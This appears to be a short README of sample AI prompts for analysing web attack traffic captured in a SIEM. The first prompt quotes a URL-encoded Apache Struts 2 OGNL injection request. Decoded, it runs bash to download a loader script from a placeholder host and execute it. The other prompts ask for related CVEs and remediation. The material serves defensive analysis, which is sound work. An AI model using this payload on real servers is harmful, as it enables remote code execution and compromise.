# Network Analysis

Inspired by [GreyNoise Sift](https://www.greynoise.io/blog/introducing-sift-automated-threat-hunting) and the possibilities to help in a number of areas where Layers 4-7 Web traffic is captured in SIEM and may need further analysis. Whether analyzing a URI, web traffic received, or using a Natural Language Prompt to KQL to provide further insights from Azure Web App Firewall among other use cases.
<a  name="URI Analysis"></a>

**Prompt 1:** A *Apache Struts 2* web server received a web call 
```"GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28new%20String%5B%5D%7B%2Fbin%2Fbash%22%2C%20%22-c%22%2C%20%22echo%20linux%26(curl%20http%3A%2F%2F<ip>%3A9991%2Fldr.sh%7C%7Cwget%20-q%20-O-%20http%3A%2F%2F<ip>%3A9991%2Fldr.sh%7C%7Ccc%20%20%20http%3A%2F%2F<ip>%3A9991%2Fldr.sh%7C%7Cww%20-q%20-O-%20http%3A%2F%2F<ip>%3A9991%2Fldr.sh)%7Cbash%22%7D%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22Exec-Output%22%2C%23a%29%29%7D/"``` 

please decode what is being passed in the URI parameters and explain what this URI with parameters is doing in each step

**Prompt 2:** Are there any known CVEs associated with this exploit ?

**Prompt 3:** Can you provide a remediation plan with actionable steps for this exploit and *CVE-2017-5638*

Disclaimer: Please know these are sample prompts and are subject to Change